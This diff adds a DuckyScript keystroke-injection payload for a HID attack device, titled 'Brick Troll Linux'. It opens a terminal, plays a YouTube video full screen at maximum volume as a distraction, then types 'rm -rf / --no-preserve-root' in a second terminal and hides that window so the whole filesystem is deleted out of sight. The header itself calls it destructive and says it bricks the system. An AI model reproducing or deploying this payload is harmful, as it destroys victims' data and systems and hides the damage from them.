@@ -1,0 +1,36 @@
+REM TITLE: Brick Troll Linux
+REM AUTHOR: OSINTI4L
+REM TARGET OS: Linux (tested on Kali Linux)
+REM DESCRIPTION: !! THIS IS A DESTRUCTIVE PAYLOAD !! Performs recursive, unauthenticated root removal while playing the "trololol song" at max volume in full screen mode. WARNING, this WILL brick your file system and require re-imaging (test this only in a disposable VM).
+
+REM Begin attack:
+ATTACKMODE HID
+	DELAY 1000
+
+REM Creating function top open terminal:
+FUNCTION TERMINAL()
+    CTRL ALT t
+    DELAY 500
+END_FUNCTION
+
+REM Opening terminal and loading youtube video "trololol song" in full screen, at max volume:
+TERMINAL()
+    STRINGLN firefox https://www.youtube.com/watch?v=oavMtUWDBTM
+        DELAY 2000
+            STRINGLN f
+                DELAY 100
+            HOLD UP
+        DELAY 2000
+    RELEASE UP
+
+REM Opening secondary terminal to recursively delete root file structure:
+TERMINAL()
+    STRINGLN rm -rf / --no-preserve-root
+        DELAY 200
+        
+REM Hiding terminal window so root removal runs in background and youtube video is in fg:
+ALT SPACE
+    DELAY 200
+        DOWN
+        DOWN
+            ENTER
